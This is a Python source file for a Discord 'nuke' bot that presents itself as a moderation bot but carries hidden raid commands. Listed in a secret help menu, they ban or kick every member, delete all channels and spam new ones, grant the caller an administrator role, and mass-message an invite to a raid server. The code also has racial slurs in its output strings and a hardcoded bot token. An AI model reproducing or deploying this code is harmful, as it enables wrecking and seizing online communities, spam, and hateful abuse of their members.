# nuke bot by MEDMEX#7945/MaxDaKing

import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import logging

client = commands.Bot(command_prefix='~')

client.remove_command("help")


@client.event
async def on_ready():
    print ("lets fuck these niggas up")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

@client.command(pass_context=True)
async def help(ctx):
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.red()
    )

    embed.set_author(name='help')
    embed.add_field(name='~kick', value='kick that nigga', inline=False)
    embed.add_field(name='~ban', value='make that nigga disappear', inline=False)
    embed.add_field(name='~invite', value='bitch', inline=False)
    embed.add_field(name='~clear', value='delete msgs', inline=False)
    await member.send(embed=embed)

@client.command(pass_context=True)
async def dm(ctx):
    guild = ctx.message.guild
    for member in guild.members:
     await asyncio.sleep(0)
     try:
       await member.send("https://discord.gg/TprJ222 NL NS on top")
       print("sent")
     except:
       pass

@client.command(pass_context=True)
async def clear(ctx, amount=10):
    member = ctx.message.author
    channel = ctx.message.channel
    messages = []
    async for message in channel.history(limit=int(amount)):
        messages.append(message)
    await channel.delete_messages(messages)
    await channel.send('Messages deleted')

@client.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    channel = ctx.message.channel
    if member is None:
        await channel.send('Please input a user.')
    else:
        await channel.send("**its {}**".format(member.name) + "\n**his id is {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))

@client.command(pass_context=True)
async def kick(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('whats his name.')
        else:
            await channel.send("try again later **{}**".format(member.name))
            await member.kick()
    else:
        await channel.send('You lack permission to perform this action')

@client.command(pass_context=True)
async def ban(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('whats his name.')
        else:
            await channel.send("get bitched **{}**".format(member.name))
            await member.ban()
    else:
        await channel.send('you dont got perms')


@client.command(pass_context=True)
async def invite(ctx):
    channel = ctx.message.channel
    await channel.send("https://discord.gg/TprJ222")

#Malicious purpose

@client.command(pass_context=True)
async def moderate(ctx):
    channel = ctx.message.channel
    embed = discord.Embed(
        colour = discord.Colour.blue()
    )
    embed.add_field(name="no perms", value="the bot dont got perms")
    await channel.send(embed=embed)

@client.command(pass_context=True)
async def secret(ctx):
    member = ctx.message.author
    embed = discord.Embed(
        colour = discord.Colour.red()
    )

    embed.set_author(name='secret')
    embed.add_field(name='~g', value='Bans everybody from the server (bot needs banning perms and needs to have a higher role than users', inline=False)
    embed.add_field(name='~rape', value='Deletes all channels and bans everyone (bot needs manage channels and banning perms)', inline=False)
    embed.add_field(name='~h', value='Kicks everyone from the server (bot needs kicking perms)', inline=False)
    embed.add_field(name='~dab', value='Gives you admin access (bot needs administrator)', inline=False)
    embed.add_field(name='~dm', value='Sends an invite link of the raid hub to everybody in the server', inline=False)
    await member.send(embed=embed)

@client.command(pass_context=True)
async def h(ctx):
    guild = ctx.message.guild
    for member in list(ctx.message.guild.members):
        try:
            await guild.kick(member)
            print ("User " + member.name + " is gone")
        except:
            pass
    print ("kicked all them bitches successfully")

@client.command(pass_context=True)
async def g(ctx):
    guild = ctx.message.guild
    for member in list(ctx.message.guild.members):
        try:
            await guild.ban(member)
            print ("User " + member.name + " got bitched")
        except:
            pass
    print ("them niggas cant come back")


@client.command(pass_context=True)
async def rape(ctx):
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
                print (channel.name + " is gone")
            except:
                pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')
        channel = await guild.create_text_channel( 'von runs you')

        await channel.send( "damn my finger slipped")
        for member in list(ctx.message.guild.members):
            try:
                await guild.ban(member)
                print ("User " + member.name + " got bitched")
            except:
                pass
        print ("damn my finger slipped")

@client.command(pass_context=True)
async def dab(ctx):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    await guild.create_role(name='dab', permissions=perms)
    member = ctx.message.author
    role = discord.utils.get(guild.roles, name="dab")
    await member.add_roles(role)
    print ("you in now you gotta slide undercover")

client.run("NjM1NTIxNzM5MTQ0NjkxNzIy.XayesQ.wR_UMoPUW_Gl_wJNwGevt-qbUiU")
